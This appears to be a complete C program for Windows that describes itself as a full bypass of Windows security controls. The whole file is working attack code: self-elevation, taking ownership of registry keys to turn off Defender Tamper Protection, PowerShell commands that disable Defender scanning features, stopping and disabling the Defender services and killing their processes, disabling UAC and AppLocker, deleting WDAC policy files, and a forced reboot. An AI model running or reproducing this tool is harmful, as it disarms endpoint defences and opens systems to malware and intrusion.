#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <aclapi.h>
#include <tchar.h>
#include <tlhelp32.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

// ---- Helper: Elevate to admin if not already ----
void ElevateSelf() {
    BOOL isElevated = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elev;
        DWORD size = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &elev, size, &size))
            isElevated = elev.TokenIsElevated;
        CloseHandle(hToken);
    }
    if (!isElevated) {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpVerb = L"runas";
        sei.lpFile = exePath;
        sei.nShow = SW_SHOWNORMAL;
        if (ShellExecuteExW(&sei)) {
            ExitProcess(0);
        } else {
            wprintf(L"[-] Failed to elevate. Run as administrator manually.\n");
            ExitProcess(1);
        }
    }
}

// ---- Take ownership + set full control for Administrators ----
BOOL TakeOwnershipAndGrantFullControl(LPCWSTR subkey) {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey, 0, WRITE_OWNER | WRITE_DAC, &hKey) != ERROR_SUCCESS)
        return FALSE;

    // Set owner to Administrators group (SID: S-1-5-32-544)
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PSID adminGroupSid = NULL;
    AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                             DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &adminGroupSid);

    // Take ownership
    BOOL result = SetNamedSecurityInfoW((LPWSTR)subkey, SE_REGISTRY_KEY,
                                        OWNER_SECURITY_INFORMATION,
                                        adminGroupSid, NULL, NULL, NULL) == ERROR_SUCCESS;

    if (result) {
        // Grant Administrators full control
        EXPLICIT_ACCESS_W ea = {0};
        ea.grfAccessPermissions = KEY_ALL_ACCESS;
        ea.grfAccessMode = SET_ACCESS;
        ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
        ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
        ea.Trustee.TrusteeType = TRUSTEE_IS_GROUP;
        ea.Trustee.ptstrName = (LPWSTR)adminGroupSid;

        PACL newAcl = NULL;
        result = SetEntriesInAclW(1, &ea, NULL, &newAcl) == ERROR_SUCCESS &&
                 SetNamedSecurityInfoW((LPWSTR)subkey, SE_REGISTRY_KEY,
                                       DACL_SECURITY_INFORMATION,
                                       NULL, NULL, newAcl, NULL) == ERROR_SUCCESS;
        if (newAcl) LocalFree(newAcl);
    }

    FreeSid(adminGroupSid);
    RegCloseKey(hKey);
    return result;
}

// ---- Disable Tamper Protection ----
BOOL DisableTamperProtection() {
    LPCWSTR tpKey = L"SOFTWARE\\Microsoft\\Windows Defender\\Features";
    HKEY hKey;

    if (!TakeOwnershipAndGrantFullControl(tpKey))
        return FALSE;

    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, tpKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD zero = 0;
        LONG ret = RegSetValueExW(hKey, L"TamperProtection", 0, REG_DWORD, (BYTE*)&zero, sizeof(zero));
        RegCloseKey(hKey);
        if (ret == ERROR_SUCCESS) {
            wprintf(L"[+] Tamper Protection disabled (registry).\n");
            return TRUE;
        }
    }
    return FALSE;
}

// ---- Disable Defender real-time + service ----
void DisableDefender() {
    // First attempt via PowerShell (requires TP off)
    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
    system("powershell -Command \"Set-MpPreference -DisableBehaviorMonitoring $true\"");
    system("powershell -Command \"Set-MpPreference -DisableBlockAtFirstSeen $true\"");
    system("powershell -Command \"Set-MpPreference -DisableIOAVProtection $true\"");
    system("powershell -Command \"Set-MpPreference -DisablePrivacyMode $true\"");
    system("powershell -Command \"Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true\"");
    system("powershell -Command \"Set-MpPreference -DisableArchiveScanning $true\"");
    system("powershell -Command \"Set-MpPreference -DisableIntrusionPreventionSystem $true\"");
    system("powershell -Command \"Set-MpPreference -DisableScriptScanning $true\"");
    system("powershell -Command \"Set-MpPreference -SubmitSamplesConsent 2\"");

    // Disable the service
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scm) {
        SC_HANDLE svc = OpenServiceW(scm, L"WinDefend", SERVICE_STOP | SERVICE_CHANGE_CONFIG);
        if (svc) {
            SERVICE_STATUS status;
            ControlService(svc, SERVICE_CONTROL_STOP, &status);
            ChangeServiceConfigW(svc, SERVICE_NO_CHANGE, SERVICE_DISABLED, SERVICE_NO_CHANGE,
                                 NULL, NULL, NULL, NULL, NULL, NULL, NULL);
            CloseServiceHandle(svc);
            wprintf(L"[+] WinDefend service stopped & disabled.\n");
        }
        // Also disable WdNisSvc (network inspection)
        svc = OpenServiceW(scm, L"WdNisSvc", SERVICE_STOP | SERVICE_CHANGE_CONFIG);
        if (svc) {
            ControlService(svc, SERVICE_CONTROL_STOP, &status);
            ChangeServiceConfigW(svc, SERVICE_NO_CHANGE, SERVICE_DISABLED, SERVICE_NO_CHANGE,
                                 NULL, NULL, NULL, NULL, NULL, NULL, NULL);
            CloseServiceHandle(svc);
            wprintf(L"[+] WdNisSvc stopped.\n");
        }
        CloseServiceHandle(scm);
    }
}

// ---- Disable UAC ----
void DisableUAC() {
    HKEY hKey;
    DWORD zero = 0;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"EnableLUA", 0, REG_DWORD, (BYTE*)&zero, sizeof(zero));
        RegCloseKey(hKey);
        wprintf(L"[+] UAC disabled (reboot required).\n");
    }
}

// ---- Disable AppLocker / WDAC ----
void DisableAppLockerWDAC() {
    // Stop Application Identity service
    system("net stop appidsvc /y >nul 2>&1");
    // Disable the service
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scm) {
        SC_HANDLE svc = OpenServiceW(scm, L"AppIDSvc", SERVICE_CHANGE_CONFIG);
        if (svc) {
            ChangeServiceConfigW(svc, SERVICE_NO_CHANGE, SERVICE_DISABLED, SERVICE_NO_CHANGE,
                                 NULL, NULL, NULL, NULL, NULL, NULL, NULL);
            CloseServiceHandle(svc);
            wprintf(L"[+] AppIDSvc disabled.\n");
        }
        CloseServiceHandle(scm);
    }

    // Delete WDAC policy files
    system("del /f /q %WINDIR%\\System32\\CodeIntegrity\\SiPolicy.p7b >nul 2>&1");
    system("del /f /q %WINDIR%\\System32\\CodeIntegrity\\SIPolicy.p7b >nul 2>&1");

    // Disable via registry (requires reboot)
    HKEY hKey;
    DWORD zero = 0;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\SystemGuard",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"Enabled", 0, REG_DWORD, (BYTE*)&zero, sizeof(zero));
        RegCloseKey(hKey);
        wprintf(L"[+] WDAC disabled via registry (reboot).\n");
    }
}

// ---- Optional: Kill Defender processes ----
void KillDefenderProcesses() {
    PROCESSENTRY32W entry = { sizeof(entry) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;

    LPCWSTR targets[] = { L"MsMpEng.exe", L"NisSrv.exe", L"MpCmdRun.exe" };
    for (int i = 0; i < 3; i++) {
        if (Process32FirstW(snapshot, &entry)) {
            do {
                if (_wcsicmp(entry.szExeFile, targets[i]) == 0) {
                    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID);
                    if (hProc) {
                        TerminateProcess(hProc, 0);
                        CloseHandle(hProc);
                        wprintf(L"[+] Terminated %s (PID %d)\n", targets[i], entry.th32ProcessID);
                    }
                }
            } while (Process32NextW(snapshot, &entry));
        }
        Process32FirstW(snapshot, &entry); // reset
    }
    CloseHandle(snapshot);
}

// ---- Main ----
int main() {
    ElevateSelf();

    wprintf(L"[*] Starting full bypass of Windows security controls...\n");

    // Step 1: Disable Tamper Protection (critical)
    if (DisableTamperProtection()) {
        wprintf(L"[*] Waiting 3 seconds for TP to deactivate...\n");
        Sleep(3000);
    } else {
        wprintf(L"[-] Failed to disable Tamper Protection. Some steps may fail.\n");
    }

    // Step 2: Disable Defender completely
    DisableDefender();
    KillDefenderProcesses();

    // Step 3: Disable UAC
    DisableUAC();

    // Step 4: Disable AppLocker & WDAC
    DisableAppLockerWDAC();

    wprintf(L"\n[+] All bypass actions completed.\n");
    wprintf(L"[!] A reboot is required for full effect (UAC, WDAC, persistent Defender disable).\n");
    wprintf(L"[*] Press any key to restart now, or close to restart later.\n");
    _getch();
    system("shutdown /r /t 5 /c \"System will reboot to apply bypass.\"");
    return 0;
}
